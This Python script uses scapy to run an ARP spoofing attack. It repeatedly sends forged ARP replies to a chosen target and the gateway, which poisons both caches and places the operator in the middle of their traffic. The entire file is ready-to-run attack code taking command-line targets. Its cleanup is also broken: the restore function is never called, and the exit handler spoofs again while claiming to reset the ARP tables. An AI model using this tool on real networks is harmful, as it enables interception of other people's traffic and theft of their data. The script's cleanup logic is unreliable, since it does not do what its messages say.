import time
import scapy.all as scapy
import optparse


#Setting Arp_spoofer Command line

parser = optparse.OptionParser()

parser.add_option('-t', '--target', dest="target_ip", help="Enter a target Ip")
parser.add_option('-g', '--gateaway', dest="gateway_ip", help="Enter a Router Ip")

(options, arguments) = parser.parse_args()



#get mac adresses
def get_mac(ip):
    #Asking for target ip and mac adress
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    
    return answered_list[0][1].hwsrc



def spoffing(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)




#restore arp table
def restore(destionation_ip, source_ip):
    #get victim mac and router mac adress
    destination_mac = get_mac(destionation_ip)
    source_mac = get_mac(source_ip)

    #create a packet
    packet = scapy.ARP(op=2, pdst=destionation_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    #send a packet to restore ARP tables
    scapy.send(packet, count= 0, verbose=False)




target_ip = options.target_ip
gateway_ip = options.gateway_ip


packet_sent = 0

try:
    while True:
       spoffing(target_ip, gateway_ip)
       spoffing(gateway_ip, target_ip)
       packet_sent += 2
       #print the result in same line with only packet_sent variable is changing
       print("\r[+] Packets sent : " + str(packet_sent), end="")
       time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting Arp tables ....Quitting\n")
    spoffing(target_ip, gateway_ip)
    spoffing(gateway_ip, target_ip)

